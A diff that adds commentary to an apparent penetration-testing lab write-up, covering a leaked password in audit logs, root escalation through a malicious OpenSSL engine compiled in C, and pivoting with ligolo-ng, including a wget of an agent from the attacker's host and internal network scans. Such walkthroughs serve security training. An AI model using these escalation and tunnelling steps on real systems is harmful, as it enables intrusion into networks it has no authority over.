@@ -758,7 +758,8 @@ webdev@dmz01:/home/webdev$
 
 ```
 
-by reading recent logs (?) with aureport its shows that the password for ilfserveradm 
+by reading recent logs (?) with aureport its shows that the password for ilfserveradm has been typed out in the terminal:
+
 ```
 webdev@dmz01:/home/webdev$ aureport --tty | less
 Error opening config file (Permission denied)
@@ -840,6 +841,11 @@ applicable law.
 Last login: Wed Jun  1 07:08:59 2022 from 127.0.0.1
 $ id
 uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
+```
+
+ilfserveradm can run openssl with sudo:
+
+```
 $ sudo -l
 Matching Defaults entries for srvadm on dmz01:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -852,7 +858,11 @@ $
 
 ## Privesc on DMZ01
 
+Found this article that shows how to exploit the openssl binary:
+
 https://medium.com/@shehacks_/from-sudo-openssl-to-root-privilege-escalation-with-dynamic-engine-abuse-c7e9e86ef41a
+
+Writing the exploit (brief explanation):
 
 ```c
 #include <openssl/engine.h>
@@ -867,6 +877,8 @@ static int bind(ENGINE *e, const char *id) {
 IMPLEMENT_DYNAMIC_BIND_FN(bind)
 IMPLEMENT_DYNAMIC_CHECK_FN()
 ```
+
+Compiling and sending to the target:
 
 ```bash
 gcc -fPIC -c exploit.c 
@@ -908,7 +920,7 @@ root@dmz01:~#
 
 ## Pivoting with ligolo
 
-Lots of interfaces, but the area of interest is the one scoped, so 172.16.8.0/23
+Lots of interfaces, but the area of interest is the one scoped, so 172.16.8.0/23 is the interface to set the pivot to:
 
 ```
 root@dmz01:~# ifconfig
@@ -1058,6 +1070,8 @@ root@dmz01:~#
 
 ```
 
+Searching for internal hosts
+
 ```
 root@dmz01:~# for i in {1..254} ;do (ping -c 1 172.16.8.$i | grep "bytes from" &) ;done
 64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=1.83 ms
@@ -1069,16 +1083,15 @@ root@dmz01:~# for i in {1..254} ;do (ping -c 1 172.16.8.$i | grep "bytes from" &
 
 >Kali
 
-```bash
-sudo ip tuntap add user root mode tun tunnel1
-sudo ip link set tunnel1 up
-```
+Starting the proxy:
 
 ```bash
 sudo ligolo-proxy -selfcert                               
 ```
 
 >DMZ01
+
+Downloading the agent (served with a python server):
 
 ```bash
 root@dmz01:~# wget http://10.10.15.11:8081/agent
@@ -1101,6 +1114,8 @@ INFO[0000] Connection established                        addr="10.10.15.11:11601
 
 ```
 
+The agent connected back:
+
 ```
 ligolo-ng » INFO[0342] Agent joined.                                 id=0050568a405f name=root@dmz01 remote="10.129.229.147:53920"
 ligolo-ng » session
@@ -1108,6 +1123,8 @@ ligolo-ng » session
 [Agent : root@dmz01] »  
 
 ```
+
+Setting the route to the correct subnet using ligolo commands:
 
 ```
 [Agent : root@dmz01] » autoroute
@@ -1131,9 +1148,7 @@ INFO[0387] Starting tunnel to root@dmz01 (0050568a405f)
 └───┴──────────────────────────────────────────────────┴───────────┴────────┘
 ```
 
-```
-sudo ip route add 172.16.8.0/23 dev tunnel
-```
+Checking if it works:
 
 ```
  netexec smb 172.16.8.0/23                 
@@ -1143,6 +1158,10 @@ SMB         172.16.8.50     445    ACADEMY-AEN-MS0  [*] Windows 10 / Server 2019
 Running nxc against 512 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 
 ```
+
+Enumerating with nmap the new hosts disclosed:
+
+This is the domain controller:
 
 ```
 nmap -sC -sV 172.16.8.3 --open                                                                     
